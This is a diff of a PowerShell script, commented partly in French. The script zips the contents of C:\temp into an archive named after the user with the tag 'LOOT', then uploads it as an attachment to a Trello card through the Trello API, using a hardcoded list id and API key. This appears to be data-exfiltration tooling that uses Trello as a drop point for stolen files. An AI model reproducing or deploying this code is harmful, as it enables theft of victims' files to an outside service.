@@ -82,18 +82,34 @@ $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
 $sourceDirectory = "C:\temp"
 
 function ZipFiles {
+    # Specify the username
+    $username = $env:username
+
     # Specify the date format for the archive name
+    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
+
+    # Specify the destination zip file path with username and date
     $zipFileName = "${username}_LOOT_${dateSansHeure}.zip"
     $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName
+
+    # Specify the source directory
+    $sourceDirectory = "C:\temp"
 
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
 
-    return $zipFilePath
+    # Return both zip file path and name
+    return $zipFilePath, $zipFileName
 }
 
 function UploadTrello {
     # Replace the following values with your own
+    $username = $env:username
+    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH'H'mm"
+    
+    # Call ZipFiles to get the zip file path and name
+    $zipFilePath, $zipFileName = ZipFiles
+
     $name = "${username}_LOOT_${dateSansHeure}"
     $idList = "65c269cf32172bbc68af098b"
     $key = "e790f6a8afdd977c1ee4ccc549594c51"
@@ -122,14 +138,11 @@ function UploadTrello {
     # URL de l'API Trello pour ajouter une pièce jointe à la carte
     $attachmentUrl = "https://api.trello.com/1/cards/$cardId/attachments"
 
-    # Appeler la fonction ZipFiles pour obtenir le chemin du fichier zip
-    $zipFilePath = ZipFiles
-
     # Charger le fichier zip
     $fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
 
     # Envoi de la requête POST avec le fichier zip comme pièce jointe
-    $response = Invoke-RestMethod -Uri $attachmentUrl -Method Post -InFile $zipFilePath -ContentType 'multipart/form-data' -Headers @{
+    $response = Invoke-RestMethod -Uri $attachmentUrl -Method Post -InFile $zipFileName -ContentType 'multipart/form-data' -Headers @{
         "key" = $key
         "token" = $token
     }
